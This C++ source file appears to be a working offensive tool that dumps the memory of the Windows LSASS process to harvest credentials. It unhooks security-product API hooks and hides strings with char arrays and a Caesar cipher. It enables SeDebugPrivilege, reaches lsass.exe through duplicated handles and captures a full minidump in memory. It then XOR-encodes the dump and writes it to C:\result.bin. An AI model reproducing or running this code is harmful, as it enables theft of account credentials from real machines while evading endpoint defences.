#include <Windows.h>
#include <stdio.h>
#include <psapi.h>
#include "helper.h"
#include <tchar.h>
#include <iostream>
#include "hooks.h"

#pragma comment(lib, "dbghelp.lib")

extern PNtQuerySystemInformation NtQuerySystemInformation;
extern myNtOpenProcess NtOpenProcess;
extern PNtDuplicateObject NtDuplicateObject;
extern PNtQueryObject NtQueryObject;
extern _RtlInitUnicodeString RtlInitUnicodeString;
extern myNtCreateFile ntCreateFile;

DWORD bytesWritten = 0;
DWORD bytesRead = 0;
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 1024);

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		//Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass.
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;
		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		//printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

BOOL CompareUnicodeString(PUNICODE_STRING unicodeString, const wchar_t* target) {
	size_t targetLength = wcslen(target) * sizeof(WCHAR);

	if (unicodeString->Length != targetLength) {
		return FALSE;
	}

	return wcsncmp(unicodeString->Buffer, target, targetLength / sizeof(WCHAR)) == 0;
}
int main(int argc, WCHAR* argv[]) {
	const char lasStr[] = { 'l','s','a','s','s','.','e','x','e','\0' };
	const wchar_t w_lasStr[] = { 'l','s','a','s','s','.','e','x','e','\0' };
	const char miniDumpStr[] = { 'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p','\0' };
	const char strDMP[] = { 'r','e','s','u','l','t','.','b','i','n','\0' };

	PatchHooks();

	PMiniDumpWriteDump MiniDumpWriteDump = (PMiniDumpWriteDump)(GetProcAddress(LoadLibrary(charToLPCWSTR(caesarDecrypt("sqvwtae.saa",15))), miniDumpStr));

	NTSTATUS status;
	ULONG handleInfoSize = 0x10000;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	HANDLE hProcess = NULL;
	DWORD pid;
	ULONG i;
	HANDLE processHandle = NULL;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	//提升进程权限以获得 SeDebugPrivilege
	SetPrivilege(SE_DEBUG_NAME);

	Process32First(hSnapshot, &pe32);
	do {
		if (_wcsicmp(pe32.szExeFile, charToLPCWSTR(lasStr)) != 0) {
			continue;
		}
		pid = pe32.th32ProcessID;

		CLIENT_ID clientId = { 0 };
		clientId.UniqueProcess = (HANDLE)pid;
		clientId.UniqueThread = 0;

		OBJECT_ATTRIBUTES objAttr = { 0 };
		InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
		NtOpenProcess(&processHandle, PROCESS_DUP_HANDLE, &objAttr, &clientId);
		if (!processHandle) {
			printf("Could not open PID %d! (Don't try to open a system process.)\n", pid);
			continue;
		}

		handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);

		while ((status = NtQuerySystemInformation(
			_SYSTEM_INFORMATION_CLASS1::SystemHandleInformation,
			handleInfo,
			handleInfoSize,
			NULL
		)) == STATUS_INFO_LENGTH_MISMATCH)
			handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

		// NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
		if (!NT_SUCCESS(status)) {
			printf("NtQuerySystemInformation failed!\n");
			return 1;
		}

		//枚举所有的句柄
		for (i = 0; i < handleInfo->HandleCount; i++)
		{
			SYSTEM_HANDLE handle = handleInfo->Handles[i];
			HANDLE dupHandle = NULL;
			POBJECT_TYPE_INFORMATION objectTypeInfo;
			PVOID objectNameInfo;
			UNICODE_STRING objectName;

			if (handle.ProcessId != pid) {
				continue;
			}

			//复制句柄存储到dupHandle
			status = NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, 0);

			if (status != 0) {
				continue;
			}

			objectNameInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
			status = NtQueryObject(dupHandle, _OBJECT_INFORMATION_CLASS1::ObjectTypeInformation, objectNameInfo, 0x1000, NULL);
			if (status != 0) {
				CloseHandle(dupHandle);
				continue;
			}

			UNICODE_STRING objectType = *(PUNICODE_STRING)objectNameInfo;
			wchar_t path[MAX_PATH];
			DWORD maxpath = MAX_PATH;
			if (wcsstr(objectType.Buffer, L"Process") != NULL) {
				QueryFullProcessImageNameW(dupHandle, 0, path, &maxpath);
				if (wcsstr(path, w_lasStr) != NULL) {
					HANDLE outFile = NULL;
					
					WCHAR chDmpFile[MAX_PATH] = L"\\??\\C:\\";
					wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), charToLPCWSTR(strDMP));
					UNICODE_STRING uFileName;
					RtlInitUnicodeString(&uFileName, chDmpFile);
					OBJECT_ATTRIBUTES FileObjectAttributes;
					IO_STATUS_BLOCK IoStatusBlock;
					ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
					InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

					ntCreateFile(&outFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

					MINIDUMP_CALLBACK_INFORMATION callbackInfo;
					SecureZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
					callbackInfo.CallbackRoutine = minidumpCallback;
					callbackInfo.CallbackParam = NULL;

					MiniDumpWriteDump(dupHandle, NULL, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
					for (i = 0; i < bytesRead; i++) {
						((BYTE*)dumpBuffer)[i] ^= 0x17;
					}
					BOOL writeSuccess = WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
				}
			}
		}
		free(handleInfo);
	} while (Process32Next(hSnapshot, &pe32));

	return 0;
}